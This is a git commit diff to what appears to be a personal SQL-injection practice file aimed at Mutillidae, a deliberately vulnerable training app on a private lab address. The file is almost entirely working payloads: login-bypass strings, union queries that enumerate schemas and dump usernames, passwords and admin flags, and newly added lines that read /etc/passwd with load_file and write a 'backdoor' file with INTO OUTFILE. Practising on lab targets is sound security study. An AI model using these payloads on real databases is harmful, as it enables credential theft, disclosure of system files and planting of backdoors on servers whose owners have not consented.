ca9ce4927b5a4318fc9910733a652a2778e9795e
Syrt1s M4j0r <d31m05z@gmail.com>
2018-12-13 11:23:04 +0100

    Reading and writing files on the server using SQL injection vulnerability
    Signed-off-by: Syrt1s M4j0r <d31m05z@gmail.com>

--- sql-injection/injection.sql
+++ sql-injection/injection.sql
@@ -5,6 +5,8 @@ aaa' OR 1=1 #
 admin'#
 
 #GET
+#%23
+
 #http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=test' order by 1%23&password=1234&user-info-php-submit-button=View+Account+Details
 #http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,2,3,4,5%23&password=1234&user-info-php-submit-button=View+Account+Details
 
@@ -19,3 +21,9 @@ union select 1,table_name,null,null,5 from information_schema.tables
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'
 union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'
 union select 1,username,password,is_admin,5 from accounts
+
+#load file
+union select null,load_file('/etc/passwd'),null,null,null
+
+#write file
+union select null,'backdoor payload codes',null,null,null into outfile '/tmp/backdoor.txt'
